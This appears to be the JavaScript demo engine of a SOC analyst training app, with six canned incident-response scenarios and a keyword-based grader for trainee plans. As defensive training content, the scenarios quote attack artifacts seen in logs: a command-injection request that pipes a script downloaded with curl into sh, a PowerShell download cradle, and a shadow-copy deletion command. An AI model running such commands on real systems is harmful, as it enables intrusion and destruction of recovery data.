// ============================================================
// SOC TRAINER v4 — Demo Engine
// Lets the app run with zero API key: baked scenarios +
// an adaptive (keyword-scored) evaluation so feedback feels real.
// ============================================================

export const demoDelay = (ms) => new Promise((r) => setTimeout(r, ms));

// ─── Baked scenarios (match the real prompt's markdown format) ───
export const DEMO_SCENARIOS = {
  ransomware: `## 🚨 Alert Triggered
**CrowdStrike Falcon — DETECT (High Confidence)** · Rule \`SuspiciousVssAdminActivity\` fired on host **FIN-DB-03** at 09:14:22 UTC. \`vssadmin.exe\` deleted all volume shadow copies, immediately followed by an unsigned binary writing to 32 SMB shares.

## 📋 Initial Triage Data
Process tree from EDR telemetry:
\`\`\`
explorer.exe (4688)
 └─ svchost32.exe   C:\\Windows\\Temp\\   [UNSIGNED]
     ├─ powershell.exe  -enc SQBFAFgA…   (T1059.001)
     └─ vssadmin.exe    delete shadows /all /quiet   (T1490)
\`\`\`
Outbound beacon to \`185.220.101.47:443\` observed with ~60s jitter for the prior 6 hours. Windows Security log shows Event ID \`1102\` (audit log cleared) at 09:13:58 — *one minute before* the shadow copy deletion.

## 🔍 Observables & IOCs
- C2 IP: \`185.220.101.47\`
- Domain: \`payroll-update[.]net\`
- SHA256: \`a3f5c9...b9e2\` (svchost32.exe)
- Dropped file: \`C:\\Windows\\Temp\\svchost32.exe\`
- Persistence: \`HKCU\\...\\Run\\WinUpd\`
- Event IDs: \`7045\` (service install), \`1102\` (log cleared)

## ⚠️ Business Context & Constraints
**FIN-DB-03 hosts the live payroll database.** Payday processing runs in **18 hours**. A legal hold is active for an unrelated employment dispute — you **cannot** wipe and reimage without preserving forensic evidence first. The CFO is asking for a status update every 30 minutes.

## 🗂️ MITRE ATT&CK Mapping
- \`T1490\` Inhibit System Recovery — shadow copy deletion
- \`T1486\` Data Encrypted for Impact — staging detected
- \`T1059.001\` PowerShell — encoded command
- \`T1021.002\` SMB/Windows Admin Shares — lateral write burst
- \`T1070.001\` Indicator Removal: Clear Windows Event Logs

## ❓ Key Questions to Answer
1. Do you isolate FIN-DB-03 immediately, or preserve volatile evidence first given the legal hold? Justify the order.
2. Was data exfiltrated *before* encryption staging? What would confirm it?
3. Which of the 32 targeted shares hold regulated PII, and what changes your containment if they do?
4. How do you contain without tipping off an attacker who is clearly still on the network?`,

  apt: `## 🚨 Alert Triggered
**Microsoft Sentinel — Medium** · Analytics rule \`Anomalous WMI Event Subscription\` fired for host **HR-WS-114**. A permanent WMI event consumer was registered to launch a script on system startup — a hallmark of long-dwell persistence.

## 📋 Initial Triage Data
The account \`svc-backup\` (a service account that should never log in interactively) authenticated to 4 servers via \`Event ID 4624 Type 3\` across a 9-minute window. DNS logs show low-volume lookups to \`cdn-telemetry-eu[.]net\` every 4 hours with near-perfect periodicity (2% jitter).
\`\`\`
4688  wmiprvse.exe → powershell.exe -nop -w hidden -enc <b64>
4104  ScriptBlock: IEX (New-Object Net.WebClient).Download...
\`\`\`

## 🔍 Observables & IOCs
- C2 domain: \`cdn-telemetry-eu[.]net\`
- Beacon interval: \`14400s ± 2%\`
- Account: \`svc-backup\` (lateral auth, Type 3)
- Persistence: WMI \`__EventConsumer\` "SysCheck"
- Tooling hash: \`7d11ab...4c0f\`

## ⚠️ Business Context & Constraints
This environment is in scope for an **active SOC 2 audit**. Pulling production hosts offline triggers a mandatory disclosure. The adversary has been resident for an estimated **3+ weeks** — moving too fast risks burning visibility before you understand full scope.

## 🗂️ MITRE ATT&CK Mapping
- \`T1546.003\` WMI Event Subscription
- \`T1059.001\` PowerShell
- \`T1071.004\` Application Layer Protocol: DNS
- \`T1078.002\` Valid Accounts: Domain Accounts
- \`T1021.006\` Remote Services: WinRM

## ❓ Key Questions to Answer
1. Do you contain now or expand monitoring first? What's the tradeoff given 3-week dwell?
2. How do you scope the full blast radius before the adversary notices?
3. What's your plan for the \`svc-backup\` credential without alerting the attacker?
4. Is the periodic DNS a real C2 channel or a red herring? How do you prove it?`,

  insider: `## 🚨 Alert Triggered
**Forcepoint DLP — High** · Policy \`Bulk PII Egress\` triggered for user **j.okafor** (Senior Financial Analyst). 4,200 customer records matching a credit-card pattern were uploaded to a personal Google Drive account at 23:47 local — outside business hours.

## 📋 Initial Triage Data
- VPN log: user connected from a residential IP 22:10–00:30.
- Endpoint: \`7-Zip\` created \`q4_export.7z\` (1.8 GB) from a finance share 6 minutes before the upload.
- Badge log: no physical office entry for 3 days (remote).
- HR flag: employee resigned yesterday; last day is Friday.

## 🔍 Observables & IOCs
- Archive: \`q4_export.7z\` (\`SHA256 c81d…77a2\`)
- Destination: personal Drive \`drive.google.com\` (non-corp account)
- Source share: \`\\\\FS-FIN-02\\Q4_Reporting\`
- Volume: \`4,200\` PII records / \`1.8 GB\`

## ⚠️ Business Context & Constraints
HR and Legal **must** be involved before any account action — wrongful-termination exposure is real. The user still has legitimate work to finish before Friday. Any tipping-off could lead to evidence destruction or a retaliation claim.

## 🗂️ MITRE ATT&CK Mapping
- \`T1567.002\` Exfiltration to Cloud Storage
- \`T1560.001\` Archive Collected Data
- \`T1078\` Valid Accounts
- \`T1530\` Data from Cloud Storage Object

## ❓ Key Questions to Answer
1. What can you do *technically* right now without violating HR/Legal process?
2. How do you preserve evidence for a potential legal case (chain of custody)?
3. Is this malicious exfil or a benign (if sloppy) work-from-home action? What distinguishes them?
4. What's the containment that doesn't tip off the user?`,

  cloud: `## 🚨 Alert Triggered
**AWS GuardDuty — High** · Finding \`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration\` for role \`ec2-app-prod\`. The role's temporary credentials were used from IP \`91.243.59.12\` (a known VPN exit) — geographically impossible vs. the EC2 instance region.

## 📋 Initial Triage Data
CloudTrail timeline:
\`\`\`
14:02  AssumeRole ec2-app-prod        src=91.243.59.12
14:03  GetSecretValue  prod/db/master  (x12)
14:05  CreateAccessKey  user=svc-deploy (NEW backdoor)
14:07  ListBuckets → GetObject  s3://acme-customer-exports  (bulk)
\`\`\`
The instance metadata service (IMDSv1) was reachable via an SSRF in the public web app — likely the initial vector.

## 🔍 Observables & IOCs
- Source IP: \`91.243.59.12\`
- Compromised role: \`ec2-app-prod\`
- Backdoor user: \`svc-deploy\` + new access key
- Targeted secret: \`prod/db/master\`
- Exfil bucket: \`s3://acme-customer-exports\`

## ⚠️ Business Context & Constraints
The compromised role backs the **customer-facing checkout API**. Revoking it hard-down breaks payments for ~40k users mid-day. The exposed S3 bucket contains regulated customer data → **GDPR 72-hour clock** may have started.

## 🗂️ MITRE ATT&CK Mapping
- \`T1552.005\` Cloud Instance Metadata API
- \`T1078.004\` Valid Accounts: Cloud Accounts
- \`T1098.001\` Additional Cloud Credentials
- \`T1530\` Data from Cloud Storage Object

## ❓ Key Questions to Answer
1. How do you contain the role without taking checkout offline for 40k users?
2. What's your order of operations: rotate, revoke session tokens, or kill the backdoor key first?
3. Has the GDPR clock started? What evidence confirms exfiltration vs. mere access?
4. How do you close the SSRF → IMDS path so re-compromise is impossible?`,

  supply_chain: `## 🚨 Alert Triggered
**SentinelOne — Medium** · Behavioral detection on **build-agent-07**: a freshly-updated, *validly signed* vendor tool (\`OrionMonitor v8.4.1\`) spawned \`rundll32.exe\` and initiated outbound TLS to an unrecognized domain 14 minutes after install.

## 📋 Initial Triage Data
- The update was pushed via the vendor's normal auto-update channel.
- Digital signature is **valid**, but the signing certificate was issued **6 days ago** by a CA the vendor has never used before.
- Beacon: \`orion-cdn-update[.]com\` over 443, sleep 30m.
- 200 hosts in the fleet received the same update overnight.

## 🔍 Observables & IOCs
- Binary: \`OrionMonitor.exe v8.4.1\` (\`SHA256 1f9c…ab30\`)
- New signer cert serial: \`0a:ff:21:…\`
- C2: \`orion-cdn-update[.]com\`
- Child process: \`rundll32.exe\` w/ no DLL argument
- Affected: \`200\` endpoints

## ⚠️ Business Context & Constraints
OrionMonitor is your **EDR-adjacent monitoring agent** — disabling it fleet-wide creates a visibility blind spot during an active incident. You cannot confirm yet whether v8.4.1 is malicious for *all* hosts or only a targeted subset.

## 🗂️ MITRE ATT&CK Mapping
- \`T1195.002\` Compromise Software Supply Chain
- \`T1553.002\` Code Signing
- \`T1218.011\` Signed Binary Proxy: Rundll32
- \`T1071.001\` Web Protocols (C2)

## ❓ Key Questions to Answer
1. How do you verify whether v8.4.1 is malicious without detonating it in production?
2. Do you isolate all 200 hosts or a subset? What's the tradeoff with your monitoring blind spot?
3. What confirms this is a real supply-chain compromise vs. a botched legitimate release?
4. How do you communicate with the vendor without tipping off the attacker who may be watching?`,

  web: `## 🚨 Alert Triggered
**Wazuh — High** · WAF + host correlation on **WEB-PROD-02**: an HTTP \`POST /api/v2/report/export\` carried an OS-command payload, and 8 seconds later \`w3wp.exe\` spawned \`cmd.exe → whoami\`.

## 📋 Initial Triage Data
Raw access log:
\`\`\`
POST /api/v2/report/export?fmt=pdf;curl%20hxxp://45.13.2.9/s.sh|sh
200  user-agent: python-requests/2.31
\`\`\`
A new file \`info.aspx\` (web shell) appeared in \`C:\\inetpub\\wwwroot\\\` 30 seconds later. The export endpoint passes the \`fmt\` param to a shell call without sanitization (CVE-class RCE).

## 🔍 Observables & IOCs
- Attacker IP: \`45.13.2.9\`
- Payload host: \`hxxp://45.13.2.9/s.sh\`
- Web shell: \`C:\\inetpub\\wwwroot\\info.aspx\`
- Vuln endpoint: \`/api/v2/report/export\` (\`fmt\` param)
- Parent process: \`w3wp.exe\` → \`cmd.exe\`

## ⚠️ Business Context & Constraints
WEB-PROD-02 is one of four load-balanced nodes serving live traffic. Taking it down is fine *if* you're sure the other three aren't also compromised. The marketing team is mid-campaign and any downtime is escalated to the CTO.

## 🗂️ MITRE ATT&CK Mapping
- \`T1190\` Exploit Public-Facing Application
- \`T1059.003\` Windows Command Shell
- \`T1505.003\` Web Shell
- \`T1105\` Ingress Tool Transfer

## ❓ Key Questions to Answer
1. Are the other 3 nodes compromised? How do you check fast without guessing?
2. What's your containment order: pull the node, block the IP, or patch the endpoint first?
3. How do you confirm what the attacker did between the web shell drop and now?
4. What evidence do you preserve before reimaging WEB-PROD-02?`,
};

// ─── Adaptive evaluation (keyword coverage → score) ───
const RUBRIC = {
  ir:          ["isolat", "contain", "eradicat", "recover", "memory", "chain of custody", "persist", "block", "credential", "communicat", "backup", "monitor"],
  threat_hunt: ["hypothes", "log", "query", "edr", "pivot", "baseline", "scope", "event id", "splunk", "kql", "beacon", "lateral"],
  forensic:    ["volatil", "memory", "chain of custody", "image", "hash", "timeline", "artifact", "registry", "prefetch", "preserv", "mft", "attribut"],
  executive:   ["impact", "status", "downtime", "regulat", "gdpr", "customer", "risk", "decision", "leadership", "contain", "no jargon", "budget"],
  ctf:         ["t1", "ioc", "ip", "hash", "domain", "kill chain", "dwell", "patient zero", "exfil", "persist", "vector", "att&ck"],
};

const MODE_LABEL = {
  ir: "Incident Response Plan", threat_hunt: "Threat Hunt", forensic: "Forensic Investigation",
  executive: "Executive Briefing", ctf: "CTF / Flag Hunt",
};

function pickHits(text, keys) {
  const t = text.toLowerCase();
  return keys.filter((k) => t.includes(k));
}

export function buildDemoEvaluation(scenario, userPlan, modeId, difficulty) {
  const keys = RUBRIC[modeId] || RUBRIC.ir;
  const hits = pickHits(userPlan, keys);
  const missed = keys.filter((k) => !hits.includes(k));
  const len = userPlan.trim().length;

  // Score: keyword coverage (0-7) + length/structure bonus (0-3), tuned by difficulty.
  let score = (hits.length / keys.length) * 7;
  if (len > 250) score += 1;
  if (len > 600) score += 1;
  if (/##|\n-|\n\d\./.test(userPlan)) score += 1; // structured
  const diffPenalty = { tier1: 0, tier2: 0.3, tier3: 0.7, apt: 1.1 }[difficulty] || 0;
  score = Math.max(1, Math.min(10, Math.round((score - diffPenalty) * 10) / 10));

  const label = MODE_LABEL[modeId] || "response";
  const strong = hits.slice(0, 4).map((h) => `\`${h}\``).join(", ") || "a clear starting structure";
  const gaps = missed.slice(0, 5);

  const firedLine = score >= 8
    ? "You'd keep your job — and probably get the post-incident review named after you."
    : score >= 5
    ? "You isolated the box but left a door open. In a real run, that door is how they come back."
    : "You moved before you preserved. The legal hold is now compromised and the evidence is gone — that's the kind of mistake that ends with your badge on the table.";

  const lines = [
    `## Score: ${score}/10`,
    score >= 8 ? "Strong, specific, and operationally sound — minor gaps only." :
    score >= 5 ? "Adequate skeleton, but vague where it counts and missing key specifics." :
    "Concerning — significant gaps that would cause real-world failure under pressure.",
    "",
    "## ✅ Strengths",
    `You demonstrated coverage of ${strong}. ${len > 400 ? "The plan has real depth and structure — you clearly thought past the first move." : "You committed to concrete actions instead of hand-waving."}`,
    "",
    "## 🔴 Critical Failures",
    gaps.length
      ? `You never addressed **${gaps[0]}**${gaps[1] ? ` or **${gaps[1]}**` : ""}. In *this* scenario that is not optional — the IOCs and the business constraint both demand it. **Re-read the constraint: acting without it is what turns an incident into a resume-generating event.**`
      : "No glaring omissions — but watch that your specifics hold up under an auditor's questions, not just a checklist.",
    "",
    "## 🟡 Missing Actions",
    gaps.length
      ? gaps.map((g) => `- Address \`${g}\` explicitly, with the exact command or procedure — not a gesture toward it.`).join("\n")
      : "- Tighten verification steps: how do you *prove* each action worked before moving on?",
    "- Cite the specific IOCs from the scenario (the C2 IP, the persistence key) directly in your actions.",
    "",
    "## 📈 Actionable Improvement",
    "1. Lead every phase with the **order of operations** and *why* — sequencing is where seniority shows.",
    "2. Tie each step to an IOC or Event ID from the brief so it's auditable.",
    "3. Name the **business constraint** explicitly and show how it changed your decision.",
    `4. For a ${label}, close with how you'd *verify* success, not just declare it.`,
    "",
    "## 💀 The One Thing That Would Have Gotten You Fired",
    firedLine,
    "",
    "_— Demo evaluation. Add a free Groq/Gemini key in Mission Setup for live AI grading that reads every word you wrote._",
  ];
  return lines.join("\n");
}
